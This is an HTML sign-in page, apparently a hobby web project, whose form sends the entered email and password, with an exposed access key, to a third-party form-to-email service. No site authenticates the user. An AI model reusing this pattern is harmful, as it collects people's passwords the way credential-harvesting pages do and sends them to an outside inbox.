<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign In</title>
    <style>
      body {
        background-image: url(background\ sign.jpg);
        font-family: Arial, sans-serif;
        background-color: #f0f2f5;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
      }

      .signin-container {
        background-color: #ffffff;
        padding: 40px;
        border-radius: 10px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        width: 400px;
        background: transparent;
        border: 1px solid white;
        color: white;
      }

      .signin-header {
        text-align: center;
        margin-bottom: 20px;
      }

      .signin-header h2 {
        font-weight: bold;
        margin-top: 0;
      }

      .signin-header p {
        color: #ffffff;
        font-size: 14px;
      }

      .signin-form {
        display: flex;
        flex-direction: column;
      }

      .input-group {
        margin-bottom: 15px;
        display: flex;
        flex-direction: column;
      }

      .input-group label {
        margin-bottom: 5px;
        font-size: 14px;
        color: #ffffff;
      }

      .input-group input {
        padding: 10px;
        border: 1px solid #ddd;
        border-radius: 5px;
        width: 100%;
        background: transparent;
      }

      .input-group input:focus {
        border-color: #007bff;
        box-shadow: 0 0 10px rgba(0, 123, 255, 0.5);
      }

      .error-message {
        color: #red;
        font-size: 12px;
        margin-top: 5px;
      }

      .remember-me {
        display: flex;
        align-items: center;
        margin-bottom: 20px;
      }

      .remember-me input[type="checkbox"] {
        margin-right: 10px;
      }
      button{
        color: white;
        padding: 8px 40px;
        border-radius: 8px;
        border: 1px solid white;
        transition: 0.2s ease-in-out;
        font-weight: bold;
        background: transparent;
      }
      button:hover{
        background-color: rgba(237, 83, 40, 0.959);
        color: rgb(0, 0, 0);
        box-shadow: 5px 10px 10px rgba(5, 5, 5, 0.735);
      }

      .signin-btn {
        background-color: #007bff;
        color: white;
        padding: 10px 20px;
        border: none;
        border-radius: 5px;
        cursor: pointer;
      }

      .signin-btn:hover {
        background-color: #0056b3;
      }

      .signin-footer {
        text-align: center;
        margin-top: 20px;
      }

      .signin-footer p {
        color: #fefefe;
        font-size: 14px;
      }

      .signin-footer a {
        color: #007bff;
        text-decoration: none;
      }

      .signin-footer a:hover {
        color: #0056b3;
      }
    </style>
  </head>
  <body>
   
    <div class="signin-container">
      <div class="signin-header">
        <h2>Sign In</h2>
        <p>Enter your credentials to access your account</p>
      </div>
      <form class="signin-form"  action="https://api.web3forms.com/submit" method="POST">
        <input type="hidden" name="access_key" value="9597de0a-2a8e-40d5-b65d-4139df25f69c">
        <div class="input-group">
          <label for="email">Email</label>
          <input style="color: white;" type="email" id="email" name="email" placeholder="enter your email" required />
          <span class="error-message" id="email-error"></span>
        </div>
        <div class="input-group">
          <label for="password">Password</label>
          <input style="color: white;" type="password" id="password" name="password" placeholder="enter your password" required />
          <span class="error-message" id="password-error"></span>
        </div>
        <div class="remember-me">
          <input type="checkbox" id="remember-me" name="remember-me" />
          <label for="remember-me">Remember me</label>
        </div>
        <button type="submit" id="signin-btn">Sign In</button>
        <p class="forgot-password">Forgot password?</p>
      </form>
      <div class="signin-footer">
        <p>Don't have an account? <a href="#">Sign up</a></p>
      </div>
    </div>
  </body>
</html>
